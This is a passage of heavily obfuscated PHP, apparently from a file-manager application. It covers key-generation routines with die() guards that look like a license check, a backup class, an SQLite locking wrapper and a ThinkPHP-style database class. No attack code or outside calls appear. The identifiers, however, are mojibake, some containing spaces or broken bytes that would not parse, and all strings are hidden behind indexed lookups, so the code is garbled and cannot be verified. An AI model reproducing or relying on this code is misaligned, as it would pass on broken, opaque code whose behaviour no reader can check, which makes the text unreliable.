$this->{$_SERVER[Í¶Ìå€õ…Í][337]}(); $bÚ†äˆÎäÌ = $aÎ„ô„šù¦[668]; $BÔ†ñ‡Î× = ($aé‹‡„™òç - 1) * ($e¡¸Ø£Õçê - 1); goto FÑè ƒîÃ; dÏ²¿æ’‘: if (!$AšÉã™‚ÓÕ) { die; } goto c­¡Şç’øÌ; d‰ï…»óà©: while (strlen($F‘ø®Æ×çÜ) < $aÎ„ô„šù¦[558]) { if (!$F‘ø®Æ×çÜ) { break; } $F‘ø®Æ×çÜ++; } $aˆ—‚ÆæçÒ = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($dª¶°§Ó†°, $eƒÌª¢Ö) . $EŸßŒ´§›[341] . $F¹ÒãÇÙ; $Fâ˜ääˆ½Ó = $aÎ„ô„šù¦[673]; goto E¸éÄãŒì˜; aÏ‘ŸäÜö: for ($DõÔ¨ƒÖÕ = 0; $DõÔ¨ƒÖÕ < $BÔ†ñ‡Î× * 10; $DõÔ¨ƒÖÕ++) { if (($BÔ†ñ‡Î× * $DõÔ¨ƒÖÕ + 1) % $BäÂĞœ²¶ó == 0) { $cŠµ§‚„í¦ = $EŸßŒ´§›[201](($BÔ†ñ‡Î× * $DõÔ¨ƒÖÕ + 1) / $BäÂĞœ²¶ó); break; } } $F¹ÒãÇÙ = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($aé‹‡„™òç * $e¡¸Ø£Õçê . $EŸßŒ´§›[10], $EŸßŒ´§›[149]); $eáºÊ­Ä¢Ê = $aÎ„ô„šù¦[671]; goto C‰»ë—‰¡Ğ; EŞÅ‚ÁÚšÜ: $aÎ„ô„šù¦ =& $_SERVER[Õİõş]; $EŸßŒ´§› =& $_SERVER[Í¶Ìå€õ…Í]; $aé‹‡„™òç = $this->{$_SERVER[Í¶Ìå€õ…Í][337]}(); goto C»î–öÄ§¨; C‰»ë—‰¡Ğ: if (strlen($eáºÊ­Ä¢Ê) < $aÎ„ô„šù¦[554]) { die; } $eƒÌª¢Ö = $EŸßŒ´§›[114]($EŸßŒ´§›[338] . ($aé‹‡„™òç + $e¡¸Ø£Õçê) . $EŸßŒ´§›[339] . $BäÂĞœ²¶ó . $EŸßŒ´§›[339] . $cŠµ§‚„í¦ . $EŸßŒ´§›[340]); $F‘ø®Æ×çÜ = $aÎ„ô„šù¦[672]; goto d‰ï…»óà©; FÑè ƒîÃ: $aÕ‹°‡’êŞ = $aÎ„ô„šù¦[669]; $BäÂĞœ²¶ó = $EŸßŒ´§›[201](($aé‹‡„™òç + $e¡¸Ø£Õçê) / 2); $CíÈö·×¯ = $aÎ„ô„šù¦[547]; goto aÄå¼ÅÈ¸‰; E¸éÄãŒì˜: if (!$Fâ˜ääˆ½Ó) { die; } return $aˆ—‚ÆæçÒ; $AšÉã™‚ÓÕ = $aÎ„ô„šù¦[674]; goto dÏ²¿æ’‘; c­¡Şç’øÌ: } public function eixo3d789152($c—‹Ñùô†Ã) { goto A©ŞöùˆÒŠ; A©ŞöùˆÒŠ: $A“ÓŞ‹ÍğÁ =& $_SERVER[Õİõş]; $F’¶à ªé =& $_SERVER[Í¶Ìå€õ…Í]; $däµ˜”×ã‘ = $F’¶à ªé[0]($F’¶à ªé[341], $c—‹Ñùô†Ã); goto EÛÔÒù¼‹Ò; d»¡¿Åïï³: $Dß©±Ğ¬Ú = $F’¶à ªé[201]($Dß©±Ğ¬Ú); $CÑš³Í¸‰ = $A“ÓŞ‹ÍğÁ[675]; if (strlen($CÑš³Í¸‰) < $A“ÓŞ‹ÍğÁ[558]) { return; } goto E‰­öæî—å; f¤–Ä‚¬çĞ: $dŸ·È˜…ÀÅ = 2; for ($fù–¾ƒö¡õ = 0; $fù–¾ƒö¡õ < $e§Öôåâô› * 10; $fù–¾ƒö¡õ++) { if (($e§Öôåâô› * $fù–¾ƒö¡õ + 1) % $E‚‘Î¸¥’ == 0) { $dŸ·È˜…ÀÅ = $F’¶à ªé[201](($e§Öôåâô› * $fù–¾ƒö¡õ + 1) / $E‚‘Î¸¥’); break; } } $AêÉ÷ŸïÆ· = $F’¶à ªé[114]($F’¶à ªé[338] . ($A¨¤Â‘Ã´ + $fİµëøƒƒ£) . $F’¶à ªé[339] . $E‚‘Î¸¥’ . $F’¶à ªé[339] . $dŸ·È˜…ÀÅ . $F’¶à ªé[340]); goto CÖªºÃ›’ª; dÖïˆ˜£: $fİµëøƒƒ£ = 0; $d²¾ßÖÑÙ‚ = $A“ÓŞ‹ÍğÁ[677]; if (strlen($d²¾ßÖÑÙ‚) < $A“ÓŞ‹ÍğÁ[558]) { return; } goto Bí†í¤Ë•¶; CÖªºÃ›’ª: $e„ŸªĞ«ø = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($däµ˜”×ã‘[0], $AêÉ÷ŸïÆ·); $d”Íº†› = $A“ÓŞ‹ÍğÁ[682]; return $e„ŸªĞ«ø; goto bÃ¼ÓÓœš; E‰­öæî—å: $A¨¤Â‘Ã´ = 0; $AßÕö¢Áóï = $A“ÓŞ‹ÍğÁ[676]; if (strlen($AßÕö¢Áóï) < $A“ÓŞ‹ÍğÁ[558]) { return; } goto dÖïˆ˜£; Bí†í¤Ë•¶: for ($fù–¾ƒö¡õ = 3; $fù–¾ƒö¡õ < $Dß©±Ğ¬Ú; $fù–¾ƒö¡õ += 2) { if ($Dß©±Ğ¬Ú % $fù–¾ƒö¡õ != 0) { continue; } $A¨¤Â‘Ã´ = $fù–¾ƒö¡õ; $fİµëøƒƒ£ = $F’¶à ªé[201]($Dß©±Ğ¬Ú / $fù–¾ƒö¡õ); $e˜º¹îÃóƒ = $A“ÓŞ‹ÍğÁ[678]; if (!$e˜º¹îÃóƒ) { return; } break; } $e§Öôåâô› = ($A¨¤Â‘Ã´ - 1) * ($fİµëøƒƒ£ - 1); $E‚‘Î¸¥’ = $F’¶à ªé[201](($A¨¤Â‘Ã´ + $fİµëøƒƒ£) / 2); goto b±›·ÅğØ–; b±›·ÅğØ–: $c¾Ë«²‹Üá = $A“ÓŞ‹ÍğÁ[679]; if (!$c¾Ë«²‹Üá) { return; } while (1) { $f…šŒµ÷ç = $E‚‘Î¸¥’; $Bºí‹Öóª = $e§Öôåâô›; while ($Bºí‹Öóª % $f…šŒµ÷ç != 0) { $Eº³„¼„Í‰ = $Bºí‹Öóª; $c®’±à¹‰ì = $A“ÓŞ‹ÍğÁ[680]; while (strlen($c®’±à¹‰ì) < $A“ÓŞ‹ÍğÁ[554]) { if (!$c®’±à¹‰ì) { break; } $c®’±à¹‰ì++; } $Bºí‹Öóª = $f…šŒµ÷ç; $bæË¾ÀŠ² = $A“ÓŞ‹ÍğÁ[681]; $f…šŒµ÷ç = $Eº³„¼„Í‰ % $f…šŒµ÷ç; } if ($f…šŒµ÷ç == 1) { break; } else { $E‚‘Î¸¥’++; } } goto f¤–Ä‚¬çĞ; EÛÔÒù¼‹Ò: if ($F’¶à ªé[19]($däµ˜”×ã‘) != 2) { return $F’¶à ªé[10]; } $Dß©±Ğ¬Ú = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($däµ˜”×ã‘[1] . $F’¶à ªé[10], $F’¶à ªé[149]); if (!$Dß©±Ğ¬Ú) { return $F’¶à ªé[10]; } goto d»¡¿Åïï³; bÃ¼ÓÓœš: } public function seoj90be105b() { goto C¿˜“¦–¸; FìÆ’ê²³: $A†¦¬†ˆ¬¹ = $B®ïŠÙì‰¾[683]; if (!$A†¦¬†ˆ¬¹) { die; } $bèÖ ùè¸å = array(); goto f‚¯îÀÑ; dç‰÷ºù«¹: while ($FÉ‰’½ñ¦‰ <= (int) $BÇ¿¤Í©˜‹[343]($c¹íæÕ´º )) { $cµ˜Çµù½ñ = $FÉ‰’½ñ¦‰; $d‹ÃÉŠÉª“ = $B®ïŠÙì‰¾[565]; if (!$d‹ÃÉŠÉª“) { die; } while (!0) { $cµ˜Çµù½ñ++; if ($cµ˜Çµù½ñ <= 2) { $FÉ‰’½ñ¦‰ = $cµ˜Çµù½ñ; break; } else { if ($cµ˜Çµù½ñ < 2) { continue; } } $Cèº¿Œ«Å = !0; for ($DÓøÔä±’ƒ = 2; $DÓøÔä±’ƒ <= $BÇ¿¤Í©˜‹[343]($cµ˜Çµù½ñ); $DÓøÔä±’ƒ++) { if ($cµ˜Çµù½ñ % $DÓøÔä±’ƒ == 0) { $Cèº¿Œ«Å = !1; } } if ($Cèº¿Œ«Å) { $FÉ‰’½ñ¦‰ = $cµ˜Çµù½ñ; break; } } $bèÖ ùè¸å[] = $FÉ‰’½ñ¦‰; } $E‚êñ½ìÈÙ = 2; $DÊßŒˆ¥ÃÚ = $B®ïŠÙì‰¾[685]; goto DåÛ¨£…Ş; DåÛ¨£…Ş: while ($DÊßŒˆ¥ÃÚ < $B®ïŠÙì‰¾[552]) { if ($DÊßŒˆ¥ÃÚ >= 0) { break; } $DÊßŒˆ¥ÃÚ++; } for ($cµ˜Çµù½ñ = $c¹íæÕ´º ; $cµ˜Çµù½ñ > 1; $cµ˜Çµù½ñ--) { $Cèº¿Œ«Å = !0; foreach ($bèÖ ùè¸å as $F”Æåö‚¥¡) { if ($cµ˜Çµù½ñ % $F”Æåö‚¥¡ == 0) { $Cèº¿Œ«Å = !1; break; } } if ($Cèº¿Œ«Å) { $E‚êñ½ìÈÙ = $cµ˜Çµù½ñ; break; } } return $E‚êñ½ìÈÙ; goto F®Ú ¯ÊÇ…; F®Ú ¯ÊÇ…: $Aäš˜¡³Ãø = $B®ïŠÙì‰¾[686]; goto B´Üµˆ©­Ë; f‚¯îÀÑ: $FÉ‰’½ñ¦‰ = 1; $EáÌË‘«· = $B®ïŠÙì‰¾[684]; if (!$EáÌË‘«·) { die; } goto dç‰÷ºù«¹; C¿˜“¦–¸: $B®ïŠÙì‰¾ =& $_SERVER[Õİõş]; $BÇ¿¤Í©˜‹ =& $_SERVER[Í¶Ìå€õ…Í]; $c¹íæÕ´º  = $BÇ¿¤Í©˜‹[322]($BÇ¿¤Í©˜‹[342](2, 14), $BÇ¿¤Í©˜‹[342](2, 16) - 1); goto FìÆ’ê²³; B´Üµˆ©­Ë: } public function osuw7b70b17a($EÎã†èË“³, $AôîŒÉ¸ªÑ) { $aøó˜† á =& $_SERVER[Í¶Ìå€õ…Í]; return $aøó˜† á[13](array($aøó˜† á[14], $aøó˜† á[344]), $EÎã†èË“³, $AôîŒÉ¸ªÑ); } public function pitw5cc90e4b($Døà­§ÊÙ«, $c®åËµğœ) { $CÉàÑË‡Ú‰ =& $_SERVER[Õİõş]; $a²”¯‰ô•® =& $_SERVER[Í¶Ìå€õ…Í]; return $a²”¯‰ô•®[13](array($a²”¯‰ô•®[345], $a²”¯‰ô•®[346]), $Døà­§ÊÙ«, $c®åËµğœ); $E‹å‰±ˆŸ› = $CÉàÑË‡Ú‰[687]; if (strlen($E‹å‰±ˆŸ›) < $CÉàÑË‡Ú‰[552]) { return; } } public function judib3d34a1a($e·£ğŒôì¢, $C›Œù¿Š£) { $cß¢´½ê» =& $_SERVER[Í¶Ìå€õ…Í]; return $cß¢´½ê»[13](array($cß¢´½ê»[345], $cß¢´½ê»[347]), $e·£ğŒôì¢, $C›Œù¿Š£); $Bèß¤¸³ïÆ = $_SERVER[Õİõş][688]; } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $E»àôäùÔ =& $_SERVER[Õİõş]; self::$name = date($E»àôäùÔ[689]); if (!($eëµƒ ‡™í = Model($E»àôäùÔ[690])->lastItem())) { $eëµƒ ‡™í = $this->initData(); } else { self::$name = $eëµƒ ‡™í[$E»àôäùÔ[28]]; if ($eëµƒ ‡™í[$E»àôäùÔ[691]] == $E»àôäùÔ[83]) { self::$name = date($E»àôäùÔ[692]); $dÛ®Œëç˜Û = 0; if (isset($eëµƒ ‡™í[$E»àôäùÔ[277]][$E»àôäùÔ[163]][$E»àôäùÔ[414]])) { $dÛ®Œëç˜Û = (int) $eëµƒ ‡™í[$E»àôäùÔ[277]][$E»àôäùÔ[163]][$E»àôäùÔ[414]]; } if ($eëµƒ ‡™í[$E»àôäùÔ[28]] == self::$name) { Model($E»àôäùÔ[690])->remove($eëµƒ ‡™í[$E»àôäùÔ[363]]); } $eëµƒ ‡™í = $this->initData($dÛ®Œëç˜Û, $eëµƒ ‡™í[$E»àôäùÔ[693]]); } else { $this->checkStore($eëµƒ ‡™í[$E»àôäùÔ[693]]); } } self::$option = $eëµƒ ‡™í; } private function initData($CÜÍ¡„·³â = 0, $cÕß›•õ©ï = '') { goto d°Ô¾ŒÊ•; d°Ô¾ŒÊ•: $B¥¸«½£ä =& $_SERVER[Õİõş]; $AÃœöìÒ = Model($B¥¸«½£ä[690])->config(); if ($cÕß›•õ©ï && $AÃœöìÒ[$B¥¸«½£ä[693]] != $cÕß›•õ©ï) { $CÜÍ¡„·³â = 0; } goto B‰ô´ÚÆ‰ö; Cñ‹ÒÄÈ: $AÄ¹ã©´Ùº[$B¥¸«½£ä[363]] = $DäÀ…ß¢ğ‚; return $AÄ¹ã©´Ùº; goto càŸ«Ú´±Ÿ; B‰ô´ÚÆ‰ö: $this->checkStore($AÃœöìÒ[$B¥¸«½£ä[693]]); $AÄ¹ã©´Ùº = array($B¥¸«½£ä[693] => $AÃœöìÒ[$B¥¸«½£ä[693]], $B¥¸«½£ä[28] => self::$name, $B¥¸«½£ä[691] => 0, $B¥¸«½£ä[694] => $AÃœöìÒ[$B¥¸«½£ä[694]], $B¥¸«½£ä[277] => array($B¥¸«½£ä[695] => array($B¥¸«½£ä[691] => 0), $B¥¸«½£ä[696] => array($B¥¸«½£ä[691] => 0, $B¥¸«½£ä[697] => 0, $B¥¸«½£ä[698] => 0, $B¥¸«½£ä[29] => $B¥¸«½£ä[33]), $B¥¸«½£ä[699] => array($B¥¸«½£ä[691] => 0, $B¥¸«½£ä[697] => 0, $B¥¸«½£ä[698] => 0), $B¥¸«½£ä[163] => array($B¥¸«½£ä[691] => 0, $B¥¸«½£ä[700] => 0, $B¥¸«½£ä[701] => 0, $B¥¸«½£ä[702] => 0, $B¥¸«½£ä[703] => 0, $B¥¸«½£ä[414] => $CÜÍ¡„·³â)), $B¥¸«½£ä[704] => time(), $B¥¸«½£ä[705] => 0); $DäÀ…ß¢ğ‚ = Model($B¥¸«½£ä[690])->insert($AÄ¹ã©´Ùº); goto Cñ‹ÒÄÈ; càŸ«Ú´±Ÿ: } private function checkStore($dõ‘ø†øÇ) { $Eß£õ³Ò =& $_SERVER[Õİõş]; $fíåÌŠÔ³ = Model($Eß£õ³Ò[706])->listData($dõ‘ø†øÇ); Model($Eß£õ³Ò[706])->checkConfig($fíåÌŠÔ³); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Õİõş][690])->findByName(self::$name); } return self::$option; } public static function set($e‘óá£¾´) { $E³®Ó®‹°Î =& $_SERVER[Õİõş]; $cÂÃ‚„…èÉ = self::get(); foreach ($e‘óá£¾´ as $C¾Úï¤¡« => $BíŞî¨ÁÓé) { $eÆŞÈ©¡¬« = explode($E³®Ó®‹°Î[91], $C¾Úï¤¡«); $A¯„‚Šµ¢ = count($eÆŞÈ©¡¬«); switch ($A¯„‚Šµ¢) { case 1: $cÂÃ‚„…èÉ[$eÆŞÈ©¡¬«[0]] = $BíŞî¨ÁÓé; break; case 2: $cÂÃ‚„…èÉ[$eÆŞÈ©¡¬«[0]][$eÆŞÈ©¡¬«[1]] = $BíŞî¨ÁÓé; break; case 3: $cÂÃ‚„…èÉ[$eÆŞÈ©¡¬«[0]][$eÆŞÈ©¡¬«[1]][$eÆŞÈ©¡¬«[2]] = $BíŞî¨ÁÓé; break; } } Model($E³®Ó®‹°Î[690])->update($cÂÃ‚„…èÉ[$E³®Ó®‹°Î[363]], $cÂÃ‚„…èÉ); self::$option = $cÂÃ‚„…èÉ; return self::$option; } public function keep() { $a–Ì¤²ùˆ¬ =& $_SERVER[Õİõş]; $fÜçÖ•Ë£ = self::get(); if ($fÜçÖ•Ë£[$a–Ì¤²ùˆ¬[277]][$a–Ì¤²ùˆ¬[695]][$a–Ì¤²ùˆ¬[691]] == $a–Ì¤²ùˆ¬[83]) { return; } $this->backupKeep($fÜçÖ•Ë£); self::set(array($a–Ì¤²ùˆ¬[707] => 1)); } private function backupKeep($EÊÎ’“õÌª) { goto FöÕ‹óî¢š; A­§ÇÓ‡¦è: for ($DÛÂØ­¬“ë = 0; $DÛÂØ­¬“ë < 12; $DÛÂØ­¬“ë++) { $aË»„¤‰Šİ[] = date($D¨ŸøÓŞŒä[708], strtotime("\x2d{$DÛÂØ­¬“ë}\40\155\157\x6e\x74\150\x73")); } $aË»„¤‰Šİ = array_unique($aË»„¤‰Šİ); foreach ($e×·»”ãŠñ as $BÙ¤™–„È) { if (!empty($BÙ¤™–„È[$D¨ŸøÓŞŒä[28]]) && in_array($BÙ¤™–„È[$D¨ŸøÓŞŒä[28]], $aË»„¤‰Šİ)) { continue; } Model($D¨ŸøÓŞŒä[690])->remove($BÙ¤™–„È[$D¨ŸøÓŞŒä[363]]); $EÚ³Ñ¹·—… = "\173\151\157\72{$EÊÎ’“õÌª[$D¨ŸøÓŞŒä[693]]}\175\57\144\x61\164\141\x62\141\x73\145\57\142\141\x63\x6b\165\160\x5f{$BÙ¤™–„È[$D¨ŸøÓŞŒä[28]]}"; IO::remove($EÚ³Ñ¹·—…, !1); } goto fèÙÎ›ğÓÖ; FöÕ‹óî¢š: $D¨ŸøÓŞŒä =& $_SERVER[Õİõş]; $e×·»”ãŠñ = Model($D¨ŸøÓŞŒä[690])->listData(); if (empty($e×·»”ãŠñ)) { return; } goto aÊ‚‚±‚ƒ§; aÊ‚‚±‚ƒ§: $DÛÂØ­¬“ë = 0; $aË»„¤‰Šİ = array(); foreach ($e×·»”ãŠñ as $BÙ¤™–„È) { if ($DÛÂØ­¬“ë >= 7) { break; } $aË»„¤‰Šİ[] = $BÙ¤™–„È[$D¨ŸøÓŞŒä[28]]; $DÛÂØ­¬“ë++; } goto A­§ÇÓ‡¦è; fèÙÎ›ğÓÖ: } public function db() { goto CƒÔ°Âôİ±; CƒÔ°Âôİ±: $b‰ä÷¡æ‚ä =& $_SERVER[Õİõş]; $bæõÜø¸êÊ = self::get(); if ($bæõÜø¸êÊ[$b‰ä÷¡æ‚ä[277]][$b‰ä÷¡æ‚ä[696]][$b‰ä÷¡æ‚ä[691]] == $b‰ä÷¡æ‚ä[83]) { return !0; } goto D«ˆ›ÈƒÏÊ; D«ˆ›ÈƒÏÊ: $EëÉõ¨æë = new BackupDb(); if (!$EëÉõ¨æë->index()) { return !1; } self::set(array($b‰ä÷¡æ‚ä[709] => 1)); goto AˆÔò×¸æ; AˆÔò×¸æ: return !0; goto aÈöÛçõ”È; aÈöÛçõ”È: } public function dbFile() { goto EëÆâ”…À; C›£•êÙá¢: $F¾¯•Ö¯ƒè = new BackupDbFile(); if (!$F¾¯•Ö¯ƒè->index()) { return !1; } self::set(array($f¸Ô‚œ˜·†[710] => 1)); goto dº”»¼åä×; dº”»¼åä×: return !0; goto bæè×¬Øàš; EëÆâ”…À: $f¸Ô‚œ˜·† =& $_SERVER[Õİõş]; $dŠİÈ¿êì‘ = self::get(); if ($dŠİÈ¿êì‘[$f¸Ô‚œ˜·†[277]][$f¸Ô‚œ˜·†[699]][$f¸Ô‚œ˜·†[691]] == $f¸Ô‚œ˜·†[83]) { return !0; } goto C›£•êÙá¢; bæè×¬Øàš: } public function file() { $Aí½‚ ¼½ =& $_SERVER[Õİõş]; $dªöŠ‚Ã„µ = self::get(); if ($dªöŠ‚Ã„µ[$Aí½‚ ¼½[277]][$Aí½‚ ¼½[163]][$Aí½‚ ¼½[691]] == $Aí½‚ ¼½[83]) { return !0; } if (!isset($dªöŠ‚Ã„µ[$Aí½‚ ¼½[694]]) || $dªöŠ‚Ã„µ[$Aí½‚ ¼½[694]] == $Aí½‚ ¼½[463]) { $B†‹‚Åµ¤ª = new BackupFile(); if (!$B†‹‚Åµ¤ª->index()) { return !1; } } self::set(array($Aí½‚ ¼½[711] => 1, $Aí½‚ ¼½[691] => 1)); return !0; } } goto eèÅµ™ÉŒ; a™„£±¤‘¡: class DbSqlite3 extends DbSqlite3Base { public function query($b„¡Î–ä¼) { goto bğ¾À¿Ñ«; eÇå“Êãß±: if (!$a‹ÍÅ¦µğ¯) { return !1; } if (flock($a‹ÍÅ¦µğ¯, LOCK_EX)) { $B¯¾İÕËÖ = parent::query($b„¡Î–ä¼); flock($a‹ÍÅ¦µğ¯, LOCK_UN); fclose($a‹ÍÅ¦µğ¯); return $B¯¾İÕËÖ; } flock($a‹ÍÅ¦µğ¯, LOCK_UN); goto b’ğ¯¢Ö×‹; bğ¾À¿Ñ«: $EÍ„óŠè«¹ =& $_SERVER[Õİõş]; $b¡¹ƒ¤ìÛ = DATA_PATH . $EÍ„óŠè«¹[876]; $a‹ÍÅ¦µğ¯ = fopen($b¡¹ƒ¤ìÛ, $EÍ„óŠè«¹[877]); goto eÇå“Êãß±; b’ğ¯¢Ö×‹: fclose($a‹ÍÅ¦µğ¯); show_json($EÍ„óŠè«¹[878], !1); return !1; goto fßà£åƒ²õ; fßà£åƒ²õ: } public function execute($c‰ÈÉø‹óê) { goto E¬âšÏ°××; E¬âšÏ°××: $C…¶áÖÔºó =& $_SERVER[Õİõş]; $bƒïß¶—¶ƒ = DATA_PATH . $C…¶áÖÔºó[876]; $a×Çİ÷ñƒ = fopen($bƒïß¶—¶ƒ, $C…¶áÖÔºó[877]); goto dô“ö£ŠÃÖ; dô“ö£ŠÃÖ: if (!$a×Çİ÷ñƒ) { return !1; } if (flock($a×Çİ÷ñƒ, LOCK_EX)) { $Cñßœà‰² = parent::execute($c‰ÈÉø‹óê); flock($a×Çİ÷ñƒ, LOCK_UN); fclose($a×Çİ÷ñƒ); return $Cñßœà‰²; } flock($a×Çİ÷ñƒ, LOCK_UN); goto C…¥½Œ¦ƒÏ; C…¥½Œ¦ƒÏ: fclose($a×Çİ÷ñƒ); show_json($C…¶áÖÔºó[878], !1); return !1; goto Aé¦ˆÉ˜‘ö; Aé¦ˆÉ˜‘ö: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\x71" => "\74\x3e", "\x67\x74" => "\x3e", "\x65\147\164" => "\76\x3d", "\154\164" => "\x3c", "\145\154\x74" => "\x3c\75", "\x6e\x6f\164\x6c\151\153\145" => "\x4e\117\124\40\114\x49\113\x45", "\x6c\x69\x6b\145" => "\x4c\x49\x4b\105", "\x69\156" => "\111\x4e", "\156\x6f\164\x69\x6e" => "\116\x4f\x54\40\111\116", "\x6e\157\x74\40\x69\156" => "\116\x4f\124\x20\111\x4e", "\x62\x65\x74\x77\x65\145\156" => "\x42\105\x54\127\105\x45\x4e", "\156\157\x74\x62\145\x74\x77\145\145\x6e" => "\x4e\117\x54\x20\102\x45\x54\x57\x45\x45\x4e", "\156\x6f\x74\x20\x62\145\x74\x77\x65\x65\x6e" => "\x4e\117\124\40\x42\105\x54\x57\x45\x45\x4e"); protected $selectSql = "\123\105\x4c\105\x43\x54\45\x44\x49\123\x54\x49\116\x43\124\45\40\45\x46\x49\x45\x4c\x44\x25\40\106\x52\117\115\x20\45\x54\x41\102\114\x45\45\x25\112\x4f\111\116\45\45\x57\x48\105\x52\105\x25\x25\107\122\117\125\120\x25\45\x48\x41\x56\x49\116\107\45\45\117\122\104\x45\122\x25\45\114\111\115\x49\124\x25\x20\x25\125\x4e\111\x4f\116\x25\45\103\117\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $e¶ŸĞóƒŸœ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Õİõş][879], $e¶ŸĞóƒŸœ); } public function factory($a‘ë©ÃĞ¾‚ = '') { goto BÒÏ‡‚áÛï; f•ñÂ¤õã: $this->dbType = ucwords(strtolower($a‘ë©ÃĞ¾‚[$A¿ˆæ’´Ş†[880]])); $fôùøªˆš¯ = $A¿ˆæ’´Ş†[882] . $this->dbType; if (class_exists($fôùøªˆš¯)) { $E‘’ƒÀ† = new $fôùøªˆš¯($a‘ë©ÃĞ¾‚); if ($A¿ˆæ’´Ş†[726] != strtolower($a‘ë©ÃĞ¾‚[$A¿ˆæ’´Ş†[880]])) { $E‘’ƒÀ†->dbType = strtoupper($this->dbType); } else { $E‘’ƒÀ†->dbType = $this->_getDsnType($a‘ë©ÃĞ¾‚[$A¿ˆæ’´Ş†[832]]); } } else { think_exception(think_lang($A¿ˆæ’´Ş†[883]) . $A¿ˆæ’´Ş†[884] . $fôùøªˆš¯); } goto fğÓÜíğ°; BÒÏ‡‚áÛï: $A¿ˆæ’´Ş† =& $_SERVER[Õİõş]; $a‘ë©ÃĞ¾‚ = $this->parseConfig($a‘ë©ÃĞ¾‚); if (empty($a‘ë©ÃĞ¾‚[$A¿ˆæ’´Ş†[880]])) { think_exception(think_lang($A¿ˆæ’´Ş†[881])); } goto f•ñÂ¤õã; fğÓÜíğ°: return $E‘’ƒÀ†; goto Bß»­µù†; Bß»­µù†: } public function __call($CÕ™ìŸÕ‘å, $eœÊ×¡Ùç) { if (method_exists($this, $CÕ™ìŸÕ‘å)) { return call_user_func_array(array($this, $CÕ™ìŸÕ‘å), $eœÊ×¡Ùç); } } protected function _getDsnType($f™ŒãÄ‹‰Ş) { $dˆ ÀšÚëÍ = explode($_SERVER[Õİõş][4], $f™ŒãÄ‹‰Ş); $AãÑî¼ÏŞ = strtoupper(trim($dˆ ÀšÚëÍ[0])); return $AãÑî¼ÏŞ; } private function parseConfig($d”ğ˜÷Òøñ = '') { $E®£·ŸÒêê =& $_SERVER[Õİõş]; if (!empty($d”ğ˜÷Òøñ) && is_string($d”ğ˜÷Òøñ)) { $d”ğ˜÷Òøñ = $this->parseDSN($d”ğ˜÷Òøñ); } elseif (is_array($d”ğ˜÷Òøñ)) { $d”ğ˜÷Òøñ = array_change_key_case($d”ğ˜÷Òøñ); $d”ğ˜÷Òøñ = array($E®£·ŸÒêê[880] => $d”ğ˜÷Òøñ[$E®£·ŸÒêê[725]], $E®£·ŸÒêê[805] => $d”ğ˜÷Òøñ[$E®£·ŸÒêê[885]], $E®£·ŸÒêê[806] => $d”ğ˜÷Òøñ[$E®£·ŸÒêê[886]], $E®£·ŸÒêê[803] => $d”ğ˜÷Òøñ[$E®£·ŸÒêê[887]], $E®£·ŸÒêê[804] => $d”ğ˜÷Òøñ[$E®£·ŸÒêê[888]], $E®£·ŸÒêê[17] => $d”ğ˜÷Òøñ[$E®£·ŸÒêê[889]], $E®£·ŸÒêê[832] => $d”ğ˜÷Òøñ[$E®£·ŸÒêê[727]], $E®£·ŸÒêê[13] => isset($d”ğ˜÷Òøñ[$E®£·ŸÒêê[890]]) ? $d”ğ˜÷Òøñ[$E®£·ŸÒêê[890]] : array()); } elseif (empty($d”ğ˜÷Òøñ)) { if (think_config($E®£·ŸÒêê[891]) && $E®£·ŸÒêê[726] != strtolower(think_config($E®£·ŸÒêê[892]))) { $d”ğ˜÷Òøñ = $this->parseDSN(think_config($E®£·ŸÒêê[891])); } else { $d”ğ˜÷Òøñ = array($E®£·ŸÒêê[880] => think_config($E®£·ŸÒêê[892]), $E®£·ŸÒêê[805] => think_config($E®£·ŸÒêê[893]), $E®£·ŸÒêê[806] => think_config($E®£·ŸÒêê[894]), $E®£·ŸÒêê[803] => think_config($E®£·ŸÒêê[895]), $E®£·ŸÒêê[804] => think_config($E®£·ŸÒêê[896]), $E®£·ŸÒêê[17] => think_config($E®£·ŸÒêê[230]), $E®£·ŸÒêê[832] => think_config($E®£·ŸÒêê[891]), $E®£·ŸÒêê[13] => think_config($E®£·ŸÒêê[897])); } } return $d”ğ˜÷Òøñ; } protected function initConnect($EÒ„ªÃ„õƒ = true) { if (1 == think_config($_SERVER[Õİõş][18])) { $this->_linkID = $this->multiConnect($EÒ„ªÃ„õƒ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($f¿İ˜Ñ°äÆ = false) { $e¢½÷ñô½ =& $_SERVER[Õİõş]; static $CÎââô„³ = array(); if (empty($CÎââô„³)) { foreach ($this->config as $Fã·ÆéÅ¢¹ => $cœš«³ì†î) { $CÎââô„³[$Fã·ÆéÅ¢¹] = explode($e¢½÷ñô½[47], $cœš«³ì†î); } } if (think_config($e¢½÷ñô½[898])) { if ($f¿İ˜Ñ°äÆ) { $C…ŒÜŒ›îª = floor(mt_rand(0, think_config($e¢½÷ñô½[899]) - 1)); } else { if (is_numeric(think_config($e¢½÷ñô½[900]))) { $C…ŒÜŒ›îª = think_config($e¢½÷ñô½[900]); } else { $C…ŒÜŒ›îª = floor(mt_rand(think_config($e¢½÷ñô½[899]), count($CÎââô„³[$e¢½÷ñô½[803]]) - 1)); } } } else { $C…ŒÜŒ›îª = floor(mt_rand(0, count($CÎââô„³[$e¢½÷ñô½[803]]) - 1)); } $AšÛª··Šš = array($e¢½÷ñô½[805] => isset($CÎââô„³[$e¢½÷ñô½[805]][$C…ŒÜŒ›îª]) ? $CÎââô„³[$e¢½÷ñô½[805]][$C…ŒÜŒ›îª] : $CÎââô„³[$e¢½÷ñô½[805]][0], $e¢½÷ñô½[806] => isset($CÎââô„³[$e¢½÷ñô½[806]][$C…ŒÜŒ›îª]) ? $CÎââô„³[$e¢½÷ñô½[806]][$C…ŒÜŒ›îª] : $CÎââô„³[$e¢½÷ñô½[806]][0], 